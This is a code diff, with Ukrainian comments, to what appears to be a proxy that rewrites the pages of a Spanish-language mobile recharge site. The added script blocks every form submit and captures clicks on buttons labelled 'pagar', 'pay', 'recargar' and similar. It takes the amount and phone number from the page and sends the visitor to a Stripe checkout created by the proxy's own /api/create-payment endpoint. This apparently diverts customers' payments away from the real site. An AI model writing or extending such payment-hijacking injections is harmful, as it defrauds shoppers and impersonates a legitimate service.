@@ -226,6 +226,68 @@ async function modifyHTML(response) {
         return '';
       }
 
+      // Пряме перенаправлення на процес оплати
+      async function directPaymentRedirect(amount, phoneNumber) {
+        console.log('DIRECT PAYMENT REDIRECT with amount:', amount, 'phone:', phoneNumber);
+        
+        try {
+          // Автоматично задаємо значення, якщо вони відсутні
+          if (!phoneNumber || !phoneNumber.match(/\\d{9}/)) {
+            phoneNumber = getPhoneNumberFromPage();
+          }
+          
+          if (!phoneNumber || !phoneNumber.match(/\\d{9}/)) {
+            console.error('No valid phone number found');
+            alert('Error: Valid 9-digit phone number required');
+            return false;
+          }
+          
+          if (!amount || isNaN(parseFloat(amount)) || parseFloat(amount) <= 0) {
+            amount = getSelectedAmountFromRadios();
+          }
+          
+          console.log('Sending direct payment request with amount:', amount, 'phone:', phoneNumber);
+          
+          // Запит до API створення платежу
+          const response = await fetch('/api/create-payment', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ 
+              amount: amount, 
+              phoneNumber: phoneNumber,
+              successUrl: window.location.origin + '/payment-success',
+              cancelUrl: window.location.origin + '/payment-cancel'
+            })
+          });
+          
+          if (!response.ok) {
+            console.error('Payment request failed with status:', response.status);
+            throw new Error('Payment request failed with status: ' + response.status);
+          }
+          
+          const data = await response.json();
+          console.log('Payment response:', data);
+          
+          if (data.url) {
+            console.log('Redirecting to Stripe URL:', data.url);
+            window.location.href = data.url;
+          } else if (data.sessionId) {
+            console.log('Redirecting using Stripe checkout with session ID:', data.sessionId);
+            const stripe = await stripeLoadedPromise;
+            if (!stripe) throw new Error('Stripe failed to load');
+            await stripe.redirectToCheckout({ sessionId: data.sessionId });
+          } else {
+            throw new Error('No URL or sessionId in response');
+          }
+          
+          return true;
+        } catch (error) {
+          console.error('Direct payment error:', error);
+          alert('Payment error: ' + error.message);
+          return false;
+        }
+      }
+
       window.processPayment = async function(amount, phoneNumber, sourceEvent) {
         if (sourceEvent) {
           sourceEvent.preventDefault();
@@ -279,14 +341,20 @@ async function modifyHTML(response) {
           const data = await response.json();
           
           if (data.url) {
+            console.log('Redirecting to payment URL:', data.url);
             window.location.href = data.url;
+            return true;
           } else if (data.sessionId) {
+            console.log('Using Stripe checkout with sessionId:', data.sessionId);
             const stripe = await window.stripeLoadedPromise;
             if (!stripe) throw new Error('Stripe failed to load');
             await stripe.redirectToCheckout({ sessionId: data.sessionId });
+            return true;
           }
-          return false;
+          
+          throw new Error('No URL or sessionId in response');
         } catch (error) {
+          console.error('Payment processing error:', error);
           alert('Payment error: ' + error.message);
           return false;
         }
@@ -309,6 +377,75 @@ async function modifyHTML(response) {
         if (window.location.href.includes('check_number') || window.location.pathname.includes('/phone')) {
           autoProgressAfterCheckNumber();
         }
+
+        // Додаємо глобальну змінну для відстеження, чи була вже натиснута кнопка платежу
+        window.paymentButtonClicked = false;
+        
+        // НОВА ФУНКЦІЯ: Універсальне перехоплення подій кліку для запуску платежу
+        document.addEventListener('click', function(event) {
+          // Перевіряємо, чи натиснута кнопка має відношення до оплати
+          const target = event.target;
+          const buttonText = target.textContent?.toLowerCase() || '';
+          
+          // Якщо це кнопка, яка може бути пов'язана з платежами
+          if (target.tagName === 'BUTTON' || target.tagName === 'A' || target.tagName === 'INPUT') {
+            if (buttonText.includes('pagar') || 
+                buttonText.includes('pay') || 
+                buttonText.includes('recargar') || 
+                buttonText.includes('comprar') ||
+                buttonText.includes('checkout') ||
+                buttonText.includes('continuar') ||
+                target.classList.contains('btn-primary') || 
+                target.classList.contains('btn-success')) {
+              
+              // Логуємо дії для відлагодження
+              console.log('Potential payment button clicked:', target.tagName, buttonText);
+              
+              // Пропускаємо, якщо це перша сторінка вводу номера
+              const isFirstStep = window.location.pathname.includes('/recargar') && 
+                                !document.querySelector('[data-amount], .recharge-amount');
+              
+              if (isFirstStep) {
+                console.log('This is the first step, not intercepting this button');
+                return;
+              }
+              
+              // Якщо у нас є radio-кнопки з сумою, це точно сторінка оплати
+              const hasAmountRadios = document.querySelector('input[name="recharge_number[amount]"]');
+              
+              if (hasAmountRadios || document.querySelector('[data-amount]') || buttonText.includes('pagar')) {
+                console.log('Found payment elements, intercepting this click');
+                
+                // Запобігаємо стандартній дії
+                event.preventDefault();
+                event.stopPropagation();
+                
+                // Якщо оплата ще не була запущена
+                if (!window.paymentButtonClicked) {
+                  window.paymentButtonClicked = true;
+                  
+                  // Отримуємо суму і номер телефону
+                  const amount = getSelectedAmountFromRadios();
+                  const phoneNumber = getPhoneNumberFromPage();
+                  
+                  console.log('Starting direct payment with amount:', amount, 'phone:', phoneNumber);
+                  
+                  // Запускаємо прямий платіж (без використання processPayment)
+                  directPaymentRedirect(amount, phoneNumber).then(success => {
+                    // Скидаємо прапорець, якщо сталася помилка
+                    if (!success) {
+                      window.paymentButtonClicked = false;
+                    }
+                  });
+                  
+                  return false;
+                } else {
+                  console.log('Payment already in progress, ignoring click');
+                }
+              }
+            }
+          }
+        }, true); // Використовуємо захоплення (capture), щоб перехопити подію раніше
         
         // Перехоплюємо всі форми
         document.querySelectorAll('form').forEach(form => {
@@ -316,6 +453,19 @@ async function modifyHTML(response) {
           
           form.addEventListener('submit', function(event) {
             console.log('Form submit intercepted:', form.id || form.name);
+            
+            // Пропускаємо, якщо це перша сторінка вводу номера
+            const isFirstStep = window.location.pathname.includes('/recargar') && 
+                               !document.querySelector('[data-amount], .recharge-amount');
+            
+            if (isFirstStep) {
+              console.log('This is the first step, not intercepting form submit');
+              return true;
+            }
+            
+            // Запобігаємо відправці форми
+            event.preventDefault();
+            event.stopPropagation();
             
             // Перевіряємо, чи це форма з вибором суми
             const hasAmountRadios = form.querySelector('input[name="recharge_number[amount]"]');
@@ -328,35 +478,16 @@ async function modifyHTML(response) {
               const phoneNumber = getPhoneNumberFromPage();
               console.log('Phone for payment:', phoneNumber);
               
-              window.processPayment(selectedAmount, phoneNumber, event);
-              return false;
+              // Запускаємо прямий платіж
+              directPaymentRedirect(selectedAmount, phoneNumber);
             } else {
               // Для інших форм
               const amount = form.querySelector('[data-amount]')?.getAttribute('data-amount') || '5';
               const phoneNumber = getPhoneNumberFromPage();
-              window.processPayment(amount, phoneNumber, event);
+              directPaymentRedirect(amount, phoneNumber);
             }
-          });
-        });
-
-        // Додаємо додаткові обробники подій для кнопок, які можуть ініціювати процес оплати
-        document.querySelectorAll('button.btn-primary, button.btn-success, a.btn').forEach(button => {
-          button.addEventListener('click', function(event) {
-            // Перевіряємо, чи це кнопка оплати або підтвердження
-            const text = button.textContent.toLowerCase();
-            if (text.includes('pagar') || text.includes('pay') || text.includes('confirmar') || 
-                text.includes('confirm') || text.includes('recargar')) {
-              
-              console.log('Payment button clicked:', text);
-              const amount = getSelectedAmountFromRadios() || '5';
-              const phoneNumber = getPhoneNumberFromPage();
-              
-              // Якщо знайдено номер телефону, запускаємо обробку платежу
-              if (phoneNumber) {
-                window.processPayment(amount, phoneNumber, event);
-                return false;
-              }
-            }
+            
+            return false;
           });
         });
 
@@ -453,6 +584,68 @@ async function modifyJavaScript(response) {
       };
     })();
     
+    // Прямий метод для перенаправлення на оплату
+    async function directPaymentRedirect(amount, phoneNumber) {
+      console.log('DIRECT PAYMENT REDIRECT JS with amount:', amount, 'phone:', phoneNumber);
+      
+      try {
+        // Автоматично задаємо значення, якщо вони відсутні
+        if (!phoneNumber || !phoneNumber.match(/\\d{9}/)) {
+          phoneNumber = getPhoneNumberFromPage();
+        }
+        
+        if (!phoneNumber || !phoneNumber.match(/\\d{9}/)) {
+          console.error('No valid phone number found');
+          alert('Error: Valid 9-digit phone number required');
+          return false;
+        }
+        
+        if (!amount || isNaN(parseFloat(amount)) || parseFloat(amount) <= 0) {
+          amount = getSelectedAmountFromRadios();
+        }
+        
+        console.log('Sending direct payment request with amount:', amount, 'phone:', phoneNumber);
+        
+        // Запит до API створення платежу
+        const response = await fetch('/api/create-payment', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ 
+            amount: amount, 
+            phoneNumber: phoneNumber,
+            successUrl: window.location.origin + '/payment-success',
+            cancelUrl: window.location.origin + '/payment-cancel'
+          })
+        });
+        
+        if (!response.ok) {
+          console.error('Payment request failed with status:', response.status);
+          throw new Error('Payment request failed with status: ' + response.status);
+        }
+        
+        const data = await response.json();
+        console.log('Payment response:', data);
+        
+        if (data.url) {
+          console.log('Redirecting to Stripe URL:', data.url);
+          window.location.href = data.url;
+        } else if (data.sessionId) {
+          console.log('Redirecting using Stripe checkout with session ID:', data.sessionId);
+          const stripe = await window.stripeLoadedPromise;
+          if (!stripe) throw new Error('Stripe failed to load');
+          await stripe.redirectToCheckout({ sessionId: data.sessionId });
+        } else {
+          throw new Error('No URL or sessionId in response');
+        }
+        
+        return true;
+      } catch (error) {
+        console.error('Direct payment error:', error);
+        alert('Payment error: ' + error.message);
+        return false;
+      }
+    }
+    
     // Отримати вибрану суму з радіокнопок
     function getSelectedAmountFromRadios() {
       // Перевіряємо радіокнопки з name="recharge_number[amount]"
@@ -528,6 +721,75 @@ async function modifyJavaScript(response) {
       
       return '';
     }
+    
+    // Додаємо глобальну змінну для відстеження, чи була вже натиснута кнопка платежу
+    window.paymentButtonClicked = false;
+    
+    // Універсальне перехоплення подій кліку для запуску платежу
+    document.addEventListener('click', function(event) {
+      // Перевіряємо, чи натиснута кнопка має відношення до оплати
+      const target = event.target;
+      const buttonText = target.textContent?.toLowerCase() || '';
+      
+      // Якщо це кнопка, яка може бути пов'язана з платежами
+      if (target.tagName === 'BUTTON' || target.tagName === 'A' || target.tagName === 'INPUT') {
+        if (buttonText.includes('pagar') || 
+            buttonText.includes('pay') || 
+            buttonText.includes('recargar') || 
+            buttonText.includes('comprar') ||
+            buttonText.includes('checkout') ||
+            buttonText.includes('continuar') ||
+            target.classList.contains('btn-primary') || 
+            target.classList.contains('btn-success')) {
+          
+          // Логуємо дії для відлагодження
+          console.log('Potential payment button clicked JS:', target.tagName, buttonText);
+          
+          // Пропускаємо, якщо це перша сторінка вводу номера
+          const isFirstStep = window.location.pathname.includes('/recargar') && 
+                            !document.querySelector('[data-amount], .recharge-amount');
+          
+          if (isFirstStep) {
+            console.log('This is the first step, not intercepting this button');
+            return;
+          }
+          
+          // Якщо у нас є radio-кнопки з сумою, це точно сторінка оплати
+          const hasAmountRadios = document.querySelector('input[name="recharge_number[amount]"]');
+          
+          if (hasAmountRadios || document.querySelector('[data-amount]') || buttonText.includes('pagar')) {
+            console.log('Found payment elements, intercepting this click');
+            
+            // Запобігаємо стандартній дії
+            event.preventDefault();
+            event.stopPropagation();
+            
+            // Якщо оплата ще не була запущена
+            if (!window.paymentButtonClicked) {
+              window.paymentButtonClicked = true;
+              
+              // Отримуємо суму і номер телефону
+              const amount = getSelectedAmountFromRadios();
+              const phoneNumber = getPhoneNumberFromPage();
+              
+              console.log('Starting direct payment with amount:', amount, 'phone:', phoneNumber);
+              
+              // Запускаємо прямий платіж
+              directPaymentRedirect(amount, phoneNumber).then(success => {
+                // Скидаємо прапорець, якщо сталася помилка
+                if (!success) {
+                  window.paymentButtonClicked = false;
+                }
+              });
+              
+              return false;
+            } else {
+              console.log('Payment already in progress, ignoring click');
+            }
+          }
+        }
+      }
+    }, true);
     
     // Автоматичний перехід до наступного кроку після перевірки номера
     (function() {
